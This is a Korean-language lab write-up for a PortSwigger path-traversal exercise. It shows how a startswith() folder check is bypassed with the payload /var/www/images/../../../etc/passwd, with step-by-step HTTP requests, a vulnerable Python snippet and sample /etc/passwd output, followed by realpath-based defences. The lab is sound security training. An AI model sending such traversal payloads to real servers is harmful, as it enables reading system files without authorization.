# Lab: File path traversal, validation of start of path

## 개요

- **난이도**: Practitioner
- **주제**: Path Traversal — 경로 시작 검증(startswith) 우회 / 검증 후 순회 추가
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

## 목표

애플리케이션이 `filename` 파라미터로 전체 파일 경로를 받고, 그 값이 기대하는 폴더(`/var/www/images`)로 시작하는지 검증한다. 검증을 통과하는 정상 접두사를 유지한 채 뒤에 `../` 를 붙여 `/etc/passwd` 를 읽는다.

## 이전 랩과의 차이

```
[002 — absolute path bypass]
  "../" 차단 → 절대경로 /etc/passwd 로 우회

[005 — validation of start of path (이번)]
  절대경로를 허용하되 "특정 폴더로 시작" 해야 함
  → 정상 접두사 + ../ 로 우회
     /var/www/images/../../../etc/passwd
```

핵심: **`startswith()` 검증은 "접두사가 맞는가"만 볼 뿐,
그 뒤에 순회 시퀀스가 붙어 다른 경로로 빠져나가는 것은 막지 못한다.**

## 취약 지점

```http
GET /image?filename=/var/www/images/21.jpg HTTP/1.1
              ↑
       전체 경로를 받아 "기대 폴더로 시작" 검증하는 파라미터
```

서버 내부 처리 (추정):

```python
filename = request.args.get("filename")

# 기대 폴더로 시작하는지만 검사
if not filename.startswith("/var/www/images"):
    return "Blocked", 400

# 검증 통과 후 그대로 사용
with open(filename, "rb") as f:
    return f.read()
```

## 우회 원리 — 접두사 유지 + 순회

검증을 통과하려면 문자열이 `/var/www/images` 로 시작해야 한다.
그 조건을 만족시키면서 최종 경로는 다른 곳을 가리키게 만들려면,
접두사 뒤에 `../` 를 충분히 붙여 상위로 탈출한다.

```
입력:  /var/www/images/../../../etc/passwd

검증 (startswith):
  "/var/www/images/../../../etc/passwd"
   ├─────────────────┤
     기대 접두사와 일치  → 통과  ✔

경로 사용 (정규화):
  /var/www/images/../../../etc/passwd
     /var/www/images/..  → /var/www
     /var/www/..         → /var
     /var/..             → /
  → /etc/passwd  ← 읽기 성공
```

```
디렉토리 깊이 계산:
  /var/www/images/   (기준)
    ..  → /var/www/
    ../..  → /var/
    ../../..  → /
    ../../../etc/passwd → /etc/passwd
```

## 공격 단계

### 1단계 — 이미지 요청 캡처

```http
GET /image?filename=/var/www/images/21.jpg HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

응답의 이미지 요청에서 전체 경로(`/var/www/images/...`)가 노출되는 것을 확인할 수 있다.

### 2단계 — 시작 경로 검증 확인

```http
GET /image?filename=/etc/passwd HTTP/1.1
→ 차단 (기대 폴더로 시작하지 않음)
```

### 3단계 — 정상 접두사 유지 + 순회 추가

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 4단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 검증 우회 관점 정리

```
[필터 동작]
  filename.startswith("/var/www/images")  ← 접두사 일치 여부만 검사

[필터가 놓치는 것]
  - 접두사 뒤의 "../" 시퀀스
  - 접두사 일치 후 다른 경로로 탈출하는 경우

[취약한 검사 vs 안전한 검사]
  취약: if filename.startswith(BASE): use(filename)
  안전: realpath 로 정규화한 뒤 BASE 내부인지 비교
```

## 방어

```
[잘못된 방어 — 이번 랩의 취약점]
  if not filename.startswith("/var/www/images"):
      차단
  open(filename)
  → "/var/www/images/../../etc/passwd" 에 우회됨

[올바른 방어 — 정규화 후 포함 관계 검사]
  import os
  base = os.path.realpath("/var/www/images")
  target = os.path.realpath(filename)
  if not (target == base or target.startswith(base + os.sep)):
      raise ValueError("허용되지 않은 경로")

  주의: startswith(base) 만 쓰면
        "/var/www/images_evil/..." 같은 형제 디렉토리도 통과할 수 있으므로
        반드시 base + os.sep 로 비교한다.

[추가 방어]
  경로 구분자 제거 후 파일명만 사용 (os.path.basename)
  파일명 화이트리스트/ID 매핑
```

## 핵심 정리

- 전체 경로를 받으면서 "기대 폴더로 시작"만 검증하면, 접두사를 유지한 채 `../` 로 탈출할 수 있다.
- `/var/www/images/../../../etc/passwd` 는 검증을 통과하고 정규화 후 `/etc/passwd` 가 된다.
- 문자열 접두사 검사(`startswith`)는 정규화를 하지 않으므로 디렉토리 탈출을 막지 못한다.
- 안전한 방어는 `realpath` 로 정규화한 뒤 `base + os.sep` 내부인지 검사하는 것이다.

## 배운 점

- 검증이 "허용 폴더로 시작하는가"에 그치면, 허용 폴더를 출발점으로 삼아 탈출하는 공격이 가능하다.
- 002 가 절대경로 자체를 허용한 문제라면, 005 는 절대경로를 제한하려다 접두사 검증만 한 문제다.
- 경로 보안에서는 접두사 비교가 아니라 "정규화 후 실제 위치가 허용 범위 안인가"를 확인해야 한다.
- `startswith("/var/www/images")` 는 `"/var/www/images_backup/..."` 도 통과하므로 구분자까지 포함해 비교해야 한다.
